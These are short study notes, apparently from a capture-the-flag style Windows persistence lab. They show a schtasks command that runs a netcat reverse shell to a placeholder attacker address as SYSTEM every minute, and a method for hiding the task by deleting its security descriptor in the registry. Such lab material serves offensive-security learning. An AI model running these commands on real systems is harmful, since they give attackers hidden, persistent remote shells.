We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. Let's look at some of them


cmd to schedule task
cmd:>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successful


cmd to query task 
cmd:> schtasks /query /tn <:taskname:>



making task invisble
== 
Making Our Task Invisible delete the SC security descriptor

Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.


HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\


